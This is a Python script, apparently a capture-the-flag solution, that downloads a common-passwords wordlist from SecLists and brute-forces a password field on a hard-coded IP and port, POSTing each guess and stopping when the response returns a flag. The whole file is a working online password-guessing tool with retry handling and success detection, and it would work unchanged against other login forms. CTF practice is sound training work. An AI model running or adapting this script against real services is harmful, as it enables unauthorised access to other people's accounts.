
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from time import sleep, time

IP = "154.57.164.75"
PORT = 35243

WORDLIST_URL = (
    "https://raw.githubusercontent.com/danielmiessler/SecLists/"
    "refs/heads/master/Passwords/Common-Credentials/"
    "500-worst-passwords.txt"
)

URL = f"http://{IP}:{PORT}/dictionary"

TIMEOUT = (3, 5)
MAX_RETRIES = 3

session = requests.Session()

retry = Retry(
    total=MAX_RETRIES,
    connect=MAX_RETRIES,
    read=0,  # Avoid automatically replaying POST requests
    status=MAX_RETRIES,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["GET"],
    respect_retry_after_header=True,
)

adapter = HTTPAdapter(max_retries=retry)
session.mount("http://", adapter)
session.mount("https://", adapter)


def load_passwords():
    print("[*] Downloading password list...")

    response = session.get(
        WORDLIST_URL,
        timeout=TIMEOUT
    )
    response.raise_for_status()

    passwords = response.text.splitlines()

    print(f"[+] Loaded {len(passwords)} passwords.")
    return passwords


def main():
    passwords = load_passwords()

    try:
        for index, password in enumerate(passwords, start=1):
            start = time()

            try:
                response = session.post(
                    URL,
                    data={"password": password},
                    timeout=TIMEOUT
                )

                elapsed = time() - start

                try:
                    data = response.json()
                except requests.exceptions.JSONDecodeError:
                    data = {}

                print(
                    f"[*] [{index}/{len(passwords)}] "
                    f"{password} | "
                    f"{response.status_code} | "
                    f"{elapsed:.2f}s",
                    flush=True
                )

                if response.ok and "flag" in data:
                    print("\n[+] Correct password found!")
                    print(f"[+] Password: {password}")
                    print(f"[+] Flag: {data['flag']}")
                    return

            except requests.exceptions.RequestException as e:
                print(f"[!] Error testing '{password}': {e}")
                sleep(1)

        print("\n[-] No matching password found.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    finally:
        session.close()


if __name__ == "__main__":
    main()
